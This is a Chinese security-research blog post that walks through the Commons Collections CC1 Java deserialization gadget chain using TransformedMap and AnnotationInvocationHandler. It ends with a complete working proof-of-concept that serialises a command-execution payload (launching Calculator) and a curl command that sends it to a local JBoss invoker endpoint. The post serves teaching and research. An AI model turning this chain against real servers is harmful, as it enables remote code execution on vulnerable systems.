---
created: 2024-10-02T13:53:00+00:00
categories:
  - 技术研究
tags:
  - Java安全
updated: 2023-03-12T00:00:00+00:00
date: 2023-01-04T00:00:00+00:00
slug: java-deserialization-cc1-transformedmap
title: Java反序列化漏洞之TransformedMap型CC1链
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d6def972-0054-4e1a-93df-c8db969f0870/11.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=da0b23f274274be7d37173660f7545114955e4f82d7cb8648b54a826843c8f54&X-Amz-SignedHeaders=host&x-id=GetObject
id: 113906e1-7468-80c2-a482-fb7a87e418cc
---

## CommonsCollections1 链简介

### Apache Commons Collections 介绍

Apache Commons Collections 是 Apache Commons 项目中的一个子项目，它提供了一套丰富的 Java 集合类和实用工具，用于增强和扩展 Java 标准库中的集合框架。这个项目旨在填补标准 Java 集合框架中的一些缺失，并提供更多功能强大的集合类和工具，以便 Java 开发者能够更轻松地处理各种集合操作。

### CommonsCollections1 链的两种不同利用方式

2015 年 1 月，加州 AppSec 安全会议上，Chris Frohoff 和 Gabe Lawrence 发表《Marshalling Pickles》主题演讲，在演讲中就 CommonsCollections1 完整调用链做出了演示，其中所用到的中间 Gadget 链是`LazyMap`类，这在随后发布的知名反序列化工具 Ysoserial 中所包含的 CommonsCollections1 链（以下简称 CC1 链）也同样如此。

2015 年 10 月 28 日，Matthias Kaiser 首次在他的《Exploiting Deserialization Vulnerabilities in Java》演讲中提到了另一种使用`TransformedMap`类作为中间 Gadget 链的 CC1 链利用方式，这种利用方式相比前者更加地简单。

2015 年 11 月 6 日，breenmachine 发表了一篇利用 Ysoserial 工具中的 CC1 链攻击 WebLogic、WebSphere、JBoss、Jenkins 等知名应用程序的文章，原因在于这些应用中大量使用了 Commons Collections 组件。

### 影响范围

如上提到的俩种不同的利用方式（`LazyMap`/`TransformedMap`），不管是哪种，所受影响的范围都是相同的。首先 JDK 版本要求小于 8u71，其次对于 Commons Collections 的版本要求在 3.2.2 以下并且 3.0 以上，可以直接通过 Maven 引入依赖，只要版本号小于等于 3.2.1 且大于等于 3.1 即可。

```xml
<!-- <https://mvnrepository.com/artifact/commons-collections/commons-collections> -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

## 准备工作

### Java 版本的选择

在 Java 8u71 这个版本中，有对`sun.reflect.annotation.AnnotationInvocationHandler#readObject`方法进行修改，从原来的`Map`对象变为`LinkedHashMap`对象，这样就会造成 CC1 链中构造的`Map`无法进行 put 或 set，从而导致该链的构造失败。

```java
// reference: <https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d>

     private void readObject(java.io.ObjectInputStream s)
         throws java.io.IOException, ClassNotFoundException {
-        s.defaultReadObject();
+        ObjectInputStream.GetField fields = s.readFields();
+
+        @SuppressWarnings("unchecked")
+        Class<? extends Annotation> t = (Class<? extends Annotation>)fields.get("type", null);
+        @SuppressWarnings("unchecked")
+        Map<String, Object> streamVals = (Map<String, Object>)fields.get("memberValues", null);

         // Check to make sure that types have not evolved incompatibly

         AnnotationType annotationType = null;
         try {
-            annotationType = AnnotationType.getInstance(type);
+            annotationType = AnnotationType.getInstance(t);
         } catch(IllegalArgumentException e) {
             // Class is no longer an annotation type; time to punch out
             throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
         }

         Map<String, Class<?>> memberTypes = annotationType.memberTypes();
+        // consistent with runtime Map type
+        Map<String, Object> mv = new LinkedHashMap<>();

         // If there are annotation members without values, that
         // situation is handled by the invoke method.
-        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
+        for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {
             String name = memberValue.getKey();
+            Object value = null;
             Class<?> memberType = memberTypes.get(name);
             if (memberType != null) {  // i.e. member still exists
-                Object value = memberValue.getValue();
+                value = memberValue.getValue();
                 if (!(memberType.isInstance(value) ||
                       value instanceof ExceptionProxy)) {
-                    memberValue.setValue(
-                        new AnnotationTypeMismatchExceptionProxy(
+                    value = new AnnotationTypeMismatchExceptionProxy(
                             value.getClass() + "[" + value + "]").setMember(
-                                annotationType.members().get(name)));
+                                annotationType.members().get(name));
                 }
             }
+            mv.put(name, value);
+        }
+
+        UnsafeAccessor.setType(this, t);
+        UnsafeAccessor.setMemberValues(this, mv);
+    }
```

所以对于 CC1 链的调试、研究学习，所需的 Java 版本必须小于 8u71 版本，8u66 版本就是一个临界的选择。但在调试过程中可以发现，JDK 中关于 sun 包都是反编译的 class 文件，这会影响到代码的阅读。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/bd029daf-a607-4d0c-80a9-83a38b384747/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7c664fce6a9dd86d94fed5d6f83fc4601cf3fd40a41a9d2b62bdd879a54d5756&X-Amz-SignedHeaders=host&x-id=GetObject)

### 添加 sun 源码

JDK 在 f8a528d0379d 这个 commit 中对`sun.reflect.annotation.AnnotationInvocationHandler#readObject`方法进行了修改。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/4cf7c550-1f24-43cb-bdf0-d14c1e4f6870/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=a661280d68fae47e38f4b5bf397784c637c5801eb7825904e965924334dc2774&X-Amz-SignedHeaders=host&x-id=GetObject)

那便下载这个 commit 的 parents 的 zip，下载链接[https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip](https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip)。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/0f723593-cdb7-4b2d-8834-24a46626f177/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=449618cf306ac325e79516ff4608c38eaa6134e028938c4241b94e791ecd7ad1&X-Amz-SignedHeaders=host&x-id=GetObject)

文件哈希如下。

```text
MD5 (jdk-af660750b2f4.zip) = 696c4e77c75dd620a20d560d4e30c551
```

下载 jdk-af660750b2f4.zip 文件至本地后，先将本地 JDK 8u66 安装目录中的 src.zip 解压，解压后的 src 文件夹同样放置在 JDK 8u66 安装目录中。最后将 jdk-af660750b2f4.zip 中`src/share/classes`下的 sun 文件夹复制到 JDK 8u66 安装目录下的 src 目录中。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/56effb4e-bb5e-4082-8e5e-67ab2741fd8e/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=44ce494680560e313ab206cf3c51749cd24539344199fe8be4616794bdd93db4&X-Amz-SignedHeaders=host&x-id=GetObject)

再回到 IDEA 中，在 IDEA 的项目结构中添加如上目录作为一个源路径。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e78442e2-2b8b-41f1-8275-696db39c65cc/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2cab08bcc9fcc6519fcae3c1e938cf131ec4b1921b6de17155aa23bb1c57748d&X-Amz-SignedHeaders=host&x-id=GetObject)

再次进入到`AnnotationInvocationHandler`这个类，可以发现已经变成 java 文件了。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/59e716f1-a176-4656-9a4f-2f48543629ca/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=43e80d505245e431746e58fb97774f83a8e848f739dbc398087059aef8641215&X-Amz-SignedHeaders=host&x-id=GetObject)

## Transformer 接口及相关实现类

### Transformer 接口

`org.apache.commons.collections.Transformer`是 Commons Collections 中的一个接口类，用于定义一个将一个对象转换为另一个对象的函数接口，该接口提供了一个待实现的`transform`方法执行转换操作。

```java
package org.apache.commons.collections;

public interface Transformer {

    /**
     * 将输入对象（保持不变）转换成某个输出对象。
     *
     * @param input：要转换的对象，应保持不变
     * @return：一个转换后的对象
     */
    public Object transform(Object input);
}
```

`Transformer`接口有几个重要的实现类，如`InvokerTransformer`、`ConstantTransformer`、`ChainedTransformer`，如下将逐一介绍这些实现类及`transform`实现方法。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a08226ed-65db-45bb-a806-4cbdba64beab/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2418254505ddff8a0e47be1a3fbdd71a648e20178ad57df7d380f878a2273a53&X-Amz-SignedHeaders=host&x-id=GetObject)

### InvokerTransformer

`InvokerTransformer`这个类是 CC1 链中的关键 sink 类，它是`Transformer`接口的一个实现类，且实现了`Serializable`，这意味着可以参与序列化。该类代码如下，已经省去多余无关的代码。

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import org.apache.commons.collections.FunctorException;
import org.apache.commons.collections.Transformer;

/**
 * 通过反射创建新对象实例的Transformer实现
 */
public class InvokerTransformer implements Transformer, Serializable {

    /** 序列版本 */
    private static final long serialVersionUID = -8653385846894047688L;

    /** 要调用的方法名 */
    private final String iMethodName;
    /** 反射参数类型数组 */
    private final Class[] iParamTypes;
    /** 反射参数数组 */
    private final Object[] iArgs;

		// ...

    /**
     * @param methodName  要调用的方法名
     * @param paramTypes  构造方法参数类型，而非克隆的
     * @param args  构造方法参数，而非克隆的
     */
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    /**
     * 通过调用输入的方法将输入转换为结果
     * @param input  要转换的输入对象
     * @return 转换后的结果，如果输入为null，则为null
     */
    public Object transform(Object input) {
        // ...
        try {
		        // 获取输入的类对象
            Class cls = input.getClass();
            // 获取指定参数名及参数类型的方法
            Method method = cls.getMethod(iMethodName, iParamTypes);
            // 通过反射调用method方法
            return method.invoke(input, iArgs);

        } catch (NoSuchMethodException ex) {
            // ...
        }
    }
```

在其中，`InvokerTransformer`方法接收三个参数，分别是要调用的方法名、方法参数类型、以及方法参数值，`transform`方法则能够根据接收的类对象使用反射进行动态调用，这便是造成任意命令执行的根本原因。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class SinkTest {

    public static void main(String[] args) throws Exception {
        Transformer t = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"open -a Calculator.app"}
        );
        t.transform(Runtime.getRuntime());
    }
}
```

在如上示例代码中，首先使用`InvokerTransformer`创建了一个 Transformer t，指定了要调用的方法名为`"exec"`，方法参数类型为`String.class`，方法参数值为`{"open -a Calculator.app"}`。随后将`Runtime.getRuntime()`作为参数传递给了 t 的`transform()`方法，这里将会调用`Runtime.getRuntime().exec("open -a Calculator.app")`方法 ，这样便能够达到命令的执行。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d52b8a46-eea9-4b07-8859-530e5a4f4cc0/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7f09bab06ac392d6851d8ec741304fa3677da8ec3e887bb37f24aed35dc1650e&X-Amz-SignedHeaders=host&x-id=GetObject)

### ConstantTransformer

`ConstantTransformer`同样是`Transformer`接口的一个实现类，也同样实现了`Serializable`。

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;
import org.apache.commons.collections.Transformer;

public class ConstantTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 6374440726369055124L;
    private final Object iConstant;

    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;
    }
}
```

这个类用于创建一个每次都返回相同常量值的 Transformer，`transform`方法接收传入的对象不会经过更改直接返回，示例代码如下。

```java
package com.javasec.cc;

import org.apache.commons.collections.functors.ConstantTransformer;

public class ConstantTransformerTest {
    public static void main(String[] args) {
        ConstantTransformer t = new ConstantTransformer(Runtime.class);

        System.out.println(t.transform(Runtime.class));
    }
}

/* 运行结果：
class java.lang.Runtime
*/
```

### ChainedTransformer

`ChainedTransformer`类也实现了`Transformer`和`Serializable`接口，该类用于将多个 Transformer 链在一起，形成一个 Transformer 链。

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;
import java.util.Collection;
import java.util.Iterator;

import org.apache.commons.collections.Transformer;

/**
 * Transformer implementation that chains the specified transformers together.
 *
 * The input object is passed to the first transformer. The transformed result is passed to the second transformer and so on.
 */
public class ChainedTransformer implements Transformer, Serializable {

    /** Serial version UID */
    private static final long serialVersionUID = 3514945074733160196L;

    /** The transformers to call in turn */
    private final Transformer[] iTransformers;

    /**
     * @param transformers  the transformers to chain, not copied, no nulls
     */
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }

    /**
     * Transforms the input to result via each decorated transformer
     *
     * @param object  the input object passed to the first transformer
     * @return the transformed result
     */
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
}
```

同时它提供了一个`transform`方法用于执行转换操作，依次将输入对象传递给链中的每个 Transformer 进行处理，并且每个 Transformer 的转换结果将作为下一个 Transformer 的输入。那么现在就可以将`InvokerTransformer`、`ConstantTransformer`、`ChainedTransformer`三者组合起来，实现一个本地命令执行的调用。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerTest {
    public static void main(String[] args) {

        Transformer[] ts = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class },
                        new Object[] {null, new Object[0] }
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String.class },
                        new Object[] {"open -a Calculator"}
                )
        };

        Transformer tc = new ChainedTransformer(ts);

        Object transform = tc.transform(null);
    }
}

```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/035ccde7-73c8-44a8-97eb-ebde49edae65/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=10b528261a136bc11a60e9120fbd64335fd04ca1144d89eaaffed09d4d4baee8&X-Amz-SignedHeaders=host&x-id=GetObject)

## TransformedMap 中间链

`org.apache.commons.collections.map.TransformedMap`类继承自`AbstractInputCheckedMapDecorator`，间接实现了`Map`接口，它是一个装饰类，用于装饰其它`Map`对象，并对其键和值进行转换。`TransformedMap`中的`decorate`方法接收三个参数，类型分别是 Map、Transformer 和 Transformer，这个方法用于创建一个装饰后的`Map`实例。

```java
public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {

    private static final long serialVersionUID = 7023152376788900464L;

    protected final Transformer keyTransformer;
    protected final Transformer valueTransformer;

    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }

    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }

    protected Object transformKey(Object object) {
        if (keyTransformer == null) {
            return object;
        }
        return keyTransformer.transform(object);
    }

    protected Object transformValue(Object object) {
        if (valueTransformer == null) {
            return object;
        }
        return valueTransformer.transform(object);
    }

    protected Map transformMap(Map map) {
        if (map.isEmpty()) {
            return map;
        }
        Map result = new LinkedMap(map.size());
        for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) {
            Map.Entry entry = (Map.Entry) it.next();
            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));
        }
        return result;
    }

    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }

    public Object put(Object key, Object value) {
        key = transformKey(key);
        value = transformValue(value);
        return getMap().put(key, value);
    }

    public void putAll(Map mapToCopy) {
        mapToCopy = transformMap(mapToCopy);
        getMap().putAll(mapToCopy);
    }
}
```

当`TransformedMap`中的`put`或`putAll`方法被调用时，在其中会调用`transformKey`和`transformValue`方法，这两个方法中存在对输入对象的`transform`方法调用。

除了`put`或`putAll`方法外，当调用继承自`AbstractInputCheckedMapDecorator`类的`setValue`方法，在其中存在对`parent.checkSetValue`方法的调用，即调用`TransformedMap`中的`checkSetValue`方法，`checkSetValue`方法中同样存在对输入对象的`transform`方法调用。

```java
static class MapEntry extends AbstractMapEntryDecorator {

    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```

那么结合以上的`InvokerTransformer`类中的`transform`，当传入一个恶意的`ChainedTransformer`至`decorate`方法中，并执行`setValue`方法时，就会触发命令的执行。注意，`decorate`方法接收的第一个参数是一个 Map，但这个 Map 不可以为空，否则就会在`org.apache.commons.collections.map.AbstractMapDecorator#AbstractMapDecorator(java.util.Map)`中抛出异常。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class TransformedMapTest {
    public static void main(String[] args) {
        Transformer[] ts = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a Calculator"})
        };

        Transformer tc = new ChainedTransformer(ts);

        Map m = new HashMap();
        m.put("x", "x");

        // 使用TransformedMap.decorate方法创建一个含有恶意调用链的Transformer类的Map对象
        Map tm =  TransformedMap.decorate(m, null, tc);

        // 执行put方法以触发transform方法的调用
        // tm.put("value", "value");

        // 遍历Map，调用setValue方法
        for (Object obj : tm.entrySet()) {
            Map.Entry entry = (Map.Entry) obj;

            // 执行setValue方法以触发InvokerTransformer的transform方法调用
            entry.setValue("test");
        }
    }
}
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/54121969-e34b-4fb9-89ae-bb565c189104/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=54ba69d81b001ce0dda8780e2ad914b7039b08c92c19c2e561a05d4663eb79d4&X-Amz-SignedHeaders=host&x-id=GetObject)

## AnnotationInvocationHandler Kick-off 类

在如上的演示中，我们通过`TransformedMap`类中的`setValue`方法触发命令的执行，但在实际反序列化利用中，还需要一个重写了`readObject`方法且其中存在类似操作的类，这个类就是 Kick-off 入口类，即`sun.reflect.annotation.AnnotationInvocationHandler`。

### 构造方法

`AnnotationInvocationHandler`类的构造方法如下，接收两个参数，第一个就是 Annotation 实现类的 Class 对象，第二个则是键为 String 值为 Object 的 Map 对象，在其中会对`superInterfaces`进行长度是否为一和是否是`java.lang.annotation.Annotation.class`的判断，如果条件成立，才会将接收的参数初始化到`type`和`memberValues`成员变量中。

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658399397L;
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }
}
```

### readObject 方法

在重写的`readObject`方法中，首先调用了`defaultReadObject`方法恢复默认的反序列化操作，以读取`type`和`memberValues`字段的值；然后利用`AnnotationType.getInstance(this.type)`方法获取`type`这个注解类所对应的`AnnotationType`对象，并获取`memberTypes`；随后对`memberTypes`的成员值进行了遍历，对于每个成员值，如果既不是 memberValue 的实例也不是 ExceptionProxy 的实例，就会获取这个成员值，并调用`setValue`方法将其转换为异常代理并设置异常信息。

```java
private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) {
                memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + "[" + value + "]").setMember(annotationType.members().get(name)));
            }
        }
    }
}
```

### 反射调用

由于`AnnotationInvocationHandler`是一个内部 API 专用类，在外部无法通过类名创建出`AnnotationInvocationHandler`类实例，所以需要通过反射创建`AnnotationInvocationHandler`对象，并且`AnnotationInvocationHandler`构造方法接收的第一个参数，需要是一个有属性的注解，如`Target.class`，而且在传入`TransformedMap.decorate`方法中的第一个 Map 参数不可为空且键需要为前者（`Target.class`）的方法名，否则在`AnnotationInvocationHandler.readObject`方法中无法通过`(memberType != null)`这个 if 判断。

```java
package java.lang.annotation;

@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.ANNOTATION_TYPE)
public @interface Target {
    ElementType[] value();
}
```

```java
Transformer tc = new ChainedTransformer(ts);

Map m = new HashMap();

// Key的值需为Target.class中的方法名称，Value的值无所谓
m.put("value", "value");

Map tm = TransformedMap.decorate(m, null, tc);

//反射调用AnnotationInvocationHandler类的构造方法
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor cst = c.getDeclaredConstructor(Class.class, Map.class);

cst.setAccessible(true);
//获取AnnotationInvocationHandler类实例，同时传入注解和tm
Object instance = cst.newInstance(Target.class, tm);
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d41a44a6-c353-4dab-a106-adb41868ecbf/10.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=ad6712ff8e94c013f3fe9904972b00296f58bec04a0c354635392b6aeee2b377&X-Amz-SignedHeaders=host&x-id=GetObject)

## 利用代码及漏洞验证

根据以上所有的结合起来，构造如下的一个最终 POC。

```java
package com.javasec.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1TransformedMap {
    public static void main(String[] args) throws Exception {

        Transformer[] ts = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a Calculator"})
        };

        Transformer tc = new ChainedTransformer(ts);

        Map m = new HashMap();
        // Key的值需为Target.class中的方法名称，Value的值无所谓
        m.put("value", "value");

        Map tm = TransformedMap.decorate(m, null, tc);

        //反射调用AnnotationInvocationHandler类的构造方法
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cst = c.getDeclaredConstructor(Class.class, Map.class);

        cst.setAccessible(true);
        //获取AnnotationInvocationHandler类实例，同时传入注解和tm
        Object instance = cst.newInstance(Target.class, tm);

				// 序列化至本地一个文件中
        FileOutputStream f = new FileOutputStream("src/main/resources/cc1.ser");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(instance);
    }
}
```

现在，向一个存在反序列化漏洞且 JDK 版本小于 8u71 的 Jboss 环境发送如上生成的恶意序列化数据，效果符合预期，如下图，成功弹出计算器。

```shell
curl -H "Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue" --data-binary "@cc1.ser" <http://localhost:8080/invoker/readonly>
<html><head><title>JBoss Web/3.0.0-CR2 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Exception report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>The server encountered an internal error () that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.lang.ClassCastException: sun.reflect.annotation.AnnotationInvocationHandler cannot be cast to org.jboss.invocation.MarshalledInvocation
        org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)
</pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the JBoss Web/3.0.0-CR2 logs.</u></p><HR size="1" noshade="noshade"><h3>JBoss Web/3.0.0-CR2</h3></body></html>
```

